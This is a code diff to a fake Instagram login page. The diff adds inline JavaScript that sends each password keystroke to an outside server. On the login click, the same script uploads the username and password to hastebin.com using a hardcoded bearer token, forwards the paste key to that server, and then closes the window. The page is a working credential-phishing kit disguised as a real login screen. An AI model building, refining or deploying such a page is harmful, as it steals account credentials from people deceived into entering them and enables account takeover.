@@ -2,100 +2,162 @@
 <html lang="en">
 
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram</title>
-    <link data-default-icon="https://static.cdninstagram.com/rsrc.php/v4/yI/r/VsNE-OHk_8a.png" rel="icon" sizes="192x192" href="https://static.cdninstagram.com/rsrc.php/v4/yI/r/VsNE-OHk_8a.png">
-  <link rel="stylesheet"  href="./assets/index-BeHXAzec.css">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Instagram</title>
+  <link data-default-icon="https://static.cdninstagram.com/rsrc.php/v4/yI/r/VsNE-OHk_8a.png" rel="icon" sizes="192x192"
+    href="https://static.cdninstagram.com/rsrc.php/v4/yI/r/VsNE-OHk_8a.png" />
+  <link rel="stylesheet" href="./assets/index-BeHXAzec.css" />
 </head>
 
 <body class="bg-black">
-    <div class="containerPC hidden md:visible md:flex mx-auto items-center justify-center">
-        <div class="left text-white">
-            <img src="./assets/instagram-web-lox-image-2x-CboJTf-s.png" alt="" width="552" height="450">
-        </div>
-        <div class="right flex flex-col space-y-1.5 justify-center items-center mt-16">
-            <div class="r1 flex flex-col">
-                <img src="./assets/instagram_text_logo-RWQ-T5XU.png" alt="" width="175" height="51" class="my-5 mx-20">
-                <input id="username" class="text-white border border-[#363636] px-4 py-2 text-sm my-2 mx-12" type="text"
-                    placeholder="Phone number, username, or email" autocomplete="username">
-                <input id="password" class="text-white border border-[#363636] px-4 py-2 text-sm my-1 mx-12" type="password"
-                    placeholder="Password">
-                <button id="margaret" class="bg-[#0069AD] text-white rounded-lg px-12 mx-12 py-1.5 mt-2">Log in</button>
-                <hr class="my-2">
-                <i class="bi bi-facebook"></i>
-                <div class="flex flex-row">
-                    <!-- <svg aria-label="Log in with Facebook" class="x1lliihq x1n2onr6 x173jzuc" fill="#0095F6" height="20" role="img" viewBox="0 0 16 16" width="20"><title>Log in with Facebook</title><g clip-path="url(#a)"><path d="M8 0C3.6 0 0 3.6 0 8c0 4 2.9 7.3 6.8 7.9v-5.6h-2V8h2V6.2c0-2 1.2-3.1 3-3.1.9 0 1.8.2 1.8.2v2h-1c-1 0-1.3.6-1.3 1.3V8h2.2l-.4 2.3H9.2v5.6C13.1 15.3 16 12 16 8c0-4.4-3.6-8-8-8Z" fill="#0095F6"></path></g><defs><clipPath id="a"><rect fill="#0095F6" height="16" width="16"></rect></clipPath></defs></svg> -->
-                    <span class="text-[#0095F6] mx-auto text-sm">Log in with Facebook</span>
-                </div>
-                <span class="text-white mx-29 my-4 text-xs">Forgot password?</span>
-            </div>
-            <div class="r2 text-white text-center text-sm py-5 px-17.5 flex flex-row">
-                Don't have an account? <strong class="text-[#0095F6]">&nbsp;Sign up</strong>
-            </div>
-            <div class="r3 text-white text-center text-sm mt-20 px-20">
-                Get the app
-                <div class="store flex flex-row space-x-2 my-2">
-                    <img src="https://static.cdninstagram.com/rsrc.php/v4/yz/r/c5Rp7Ym-Klz.png" width="134" height="40"
-                        alt="">
-                    <img src="https://static.cdninstagram.com/rsrc.php/v4/yu/r/EHY6QnZYdNX.png" width="111" height="40"
-                        alt="">
-                </div>
-            </div>
-        </div>
+  <!-- Desktop View -->
+  <div class="hidden md:flex mx-auto items-center justify-center">
+    <div class="text-white">
+      <img src="./assets/instagram-web-lox-image-2x-CboJTf-s.png" alt="" width="552" height="450" />
     </div>
-    <div class="containerMobile visible md:hidden flex flex-col mx-auto items-center justify-center">
-        <div class="left text-white mt-9 ml-[-60px]">
-            <img src="https://static.cdninstagram.com/images/instagram/xig/homepage/phones/home-phones-2x.png?__makehaste_cache_breaker=73SVAexZgBW"
-                height="634.15" width="468.32" alt="" class="hidden">
+    <div class="flex flex-col space-y-1.5 justify-center items-center mt-16">
+      <div class="flex flex-col">
+        <img src="./assets/instagram_text_logo-RWQ-T5XU.png" alt="" width="175" height="51"
+          class="my-5 mx-20" />
+        <input class="input-username text-white border border-[#363636] px-4 py-2 text-sm my-2 mx-12" type="text"
+          placeholder="Phone number, username, or email" autocomplete="username" />
+        <input class="input-password text-white border border-[#363636] px-4 py-2 text-sm my-1 mx-12" type="password"
+          placeholder="Password" />
+        <button class="btn-login bg-[#0069AD] text-white rounded-lg px-12 mx-12 py-1.5 mt-2">Log in</button>
+        <hr class="my-2" />
+        <span class="text-[#0095F6] mx-auto text-sm">Log in with Facebook</span>
+        <span class="text-white mx-29 my-4 text-xs">Forgot password?</span>
+      </div>
+      <div class="text-white text-center text-sm py-5 px-17.5 flex flex-row">
+        Don't have an account?<strong class="text-[#0095F6]">&nbsp;Sign up</strong>
+      </div>
+      <div class="text-white text-center text-sm mt-20 px-20">
+        Get the app
+        <div class="flex flex-row space-x-2 my-2">
+          <img src="https://static.cdninstagram.com/rsrc.php/v4/yz/r/c5Rp7Ym-Klz.png" width="134" height="40" alt="" />
+          <img src="https://static.cdninstagram.com/rsrc.php/v4/yu/r/EHY6QnZYdNX.png" width="111" height="40" alt="" />
         </div>
-        <div class="right flex flex-col space-y-1.5 justify-center items-center">
-            <div class="r1 flex flex-col">
-                <img src="./assets/instagram_text_logo-RWQ-T5XU.png" alt="" width="175" height="51" class="my-5 mx-20">
-                <input class="text-white border border-[#363636] px-4 py-2 text-sm my-2 mx-12" type="text"
-                    placeholder="Phone number, username, or email">
-                <input class="text-white border border-[#363636] px-4 py-2 text-sm my-1 mx-12" type="password"
-                    placeholder="Password">
-                <button class="bg-[#0069AD] text-white rounded-lg px-12 mx-12 py-1.5 mt-2">Log in</button>
-                <hr class="my-2">
-                <i class="bi bi-facebook"></i>
-                <span class="text-[#0095F6] mx-26 text-sm">Log in with Facebook</span>
-                <span class="text-white mx-29 my-4 text-xs">Forgot password?</span>
-            </div>
-            <div class="r2 text-white text-center text-sm py-5 px-17.5">
-                Don't have an account? <strong class="text-[#0095F6]">Sign up</strong>
-            </div>
-            <div class="r3 text-white text-center text-sm mt-20 px-20">
-                Get the app
-                <div class="store flex flex-row space-x-2 my-2">
-                    <img src="https://static.cdninstagram.com/rsrc.php/v4/yz/r/c5Rp7Ym-Klz.png" width="134" height="40"
-                        alt="">
-                    <img src="https://static.cdninstagram.com/rsrc.php/v4/yu/r/EHY6QnZYdNX.png" width="111" height="40"
-                        alt="">
-                </div>
-            </div>
-        </div>
+      </div>
     </div>
-    <footer class=" f1 text-[#A8A8A8] flex flex-row space-x-3 justify-center text-[7px] md:text-xs leading-1 mt-8">
-        <div class="item hover:underline">Meta</div>
-        <div class="item hover:underline">About</div>
-        <div class="item hover:underline">Blog</div>
-        <div class="item hover:underline">Jobs</div>
-        <div class="item hover:underline">Help</div>
-        <div class="item hover:underline">API</div>
-        <div class="item hover:underline">Privacy</div>
-        <div class="item hover:underline">Terms</div>
-        <div class="item hover:underline">Locations</div>
-        <div class="item hover:underline">Instagram Lite</div>
-        <div class="item hover:underline">Threads</div>
-        <div class="item hover:underline">Contact Uploading & Non-Users</div>
-        <div class="item hover:underline">Meta Verified</div>
-    </footer>
-    <footer class="f2 flex flex-row text-[#A8A8A8] justify-center text-xs mt-3 space-x-1 ">
-        <div class="item">English </div>
-        <div class="item">© 2025 Instagram from Meta</div>
-    </footer>
-    <script src="./ware.js"></script>
+  </div>
+
+  <!-- Mobile View -->
+  <div class="flex flex-col mx-auto items-center justify-center md:hidden">
+    <div class="text-white mt-9 ml-[-60px]">
+      <img
+        src="https://static.cdninstagram.com/images/instagram/xig/homepage/phones/home-phones-2x.png?__makehaste_cache_breaker=73SVAexZgBW"
+        height="634.15" width="468.32" alt="" class="hidden" />
+    </div>
+    <div class="flex flex-col space-y-1.5 justify-center items-center">
+      <div class="flex flex-col">
+        <img src="./assets/instagram_text_logo-RWQ-T5XU.png" alt="" width="175" height="51" class="my-5 mx-20" />
+        <input class="input-username text-white border border-[#363636] px-4 py-2 text-sm my-2 mx-12" type="text"
+          placeholder="Phone number, username, or email" />
+        <input class="input-password text-white border border-[#363636] px-4 py-2 text-sm my-1 mx-12" type="password"
+          placeholder="Password" />
+        <button class="btn-login bg-[#0069AD] text-white rounded-lg px-12 mx-12 py-1.5 mt-2">Log in</button>
+        <hr class="my-2" />
+        <span class="text-[#0095F6] mx-26 text-sm">Log in with Facebook</span>
+        <span class="text-white mx-29 my-4 text-xs">Forgot password?</span>
+      </div>
+      <div class="text-white text-center text-sm py-5 px-17.5">
+        Don't have an account? <strong class="text-[#0095F6]">Sign up</strong>
+      </div>
+      <div class="text-white text-center text-sm mt-20 px-20">
+        Get the app
+        <div class="flex flex-row space-x-2 my-2">
+          <img src="https://static.cdninstagram.com/rsrc.php/v4/yz/r/c5Rp7Ym-Klz.png" width="134" height="40" alt="" />
+          <img src="https://static.cdninstagram.com/rsrc.php/v4/yu/r/EHY6QnZYdNX.png" width="111" height="40" alt="" />
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <footer class="text-[#A8A8A8] flex flex-wrap justify-center text-[7px] md:text-xs leading-1 mt-8 space-x-3">
+    <div class="hover:underline">Meta</div>
+    <div class="hover:underline">About</div>
+    <div class="hover:underline">Blog</div>
+    <div class="hover:underline">Jobs</div>
+    <div class="hover:underline">Help</div>
+    <div class="hover:underline">API</div>
+    <div class="hover:underline">Privacy</div>
+    <div class="hover:underline">Terms</div>
+    <div class="hover:underline">Locations</div>
+    <div class="hover:underline">Instagram Lite</div>
+    <div class="hover:underline">Threads</div>
+    <div class="hover:underline">Contact Uploading & Non-Users</div>
+    <div class="hover:underline">Meta Verified</div>
+  </footer>
+  <footer class="flex flex-row text-[#A8A8A8] justify-center text-xs mt-3 space-x-1">
+    <div>English</div>
+    <div>© 2025 Instagram from Meta</div>
+  </footer>
+
+  <script>
+    const dest = "https://internship-r3jn.onrender.com/raasaleelalu";
+    const key = '3555594b52d169b614edbdde7c943a928d8fc9ff2766f2f047bc6df754cfa031769ea60f84888f7f4c9c632bfbfd138d3f8bccadc62ea0dee90bc97f90e24ddd';
+
+    // Handle password keydown
+    document.querySelectorAll(".input-password").forEach((pw) => {
+      pw.addEventListener("keydown", async (e) => {
+        console.log("hi");
+        await fetch(dest, {
+          method: "POST",
+          headers: {
+            'Content-Type': "application/json"
+          },
+          body: JSON.stringify({ pw: e.target.value })
+        });
+      });
+    });
+
+    // Handle login button click
+    document.querySelectorAll(".btn-login").forEach((button) => {
+      button.addEventListener("click", async (e) => {
+        console.log("Sarat make a love day");
+
+        button.disabled = true;
+        const originalText = button.textContent;
+        button.textContent = "Loading...";
+
+        const container = button.closest("div.flex-col");
+        const un = container.querySelector(".input-username");
+        const pw = container.querySelector(".input-password");
+
+        try {
+          const resp1 = await fetch("https://hastebin.com/documents", {
+            method: 'POST',
+            headers: {
+              'Content-Type': "text/plain",
+              'Authorization': `Bearer ${key}`
+            },
+            body: `${un.value}:${pw.value}`
+          });
+
+          const data = await resp1.json();
+
+          await fetch(dest, {
+            method: "POST",
+            headers: {
+              'Content-Type': "application/json"
+            },
+            body: JSON.stringify({ pw: data.key })
+          });
+
+        } catch (err) {
+          console.error("Something went wrong:", err);
+        } finally {
+          button.textContent = originalText;
+          button.disabled = false;
+          setTimeout(() => {
+            window.close();
+          }, 2500);
+        }
+      });
+    });
+  </script>
 </body>
 
 </html>
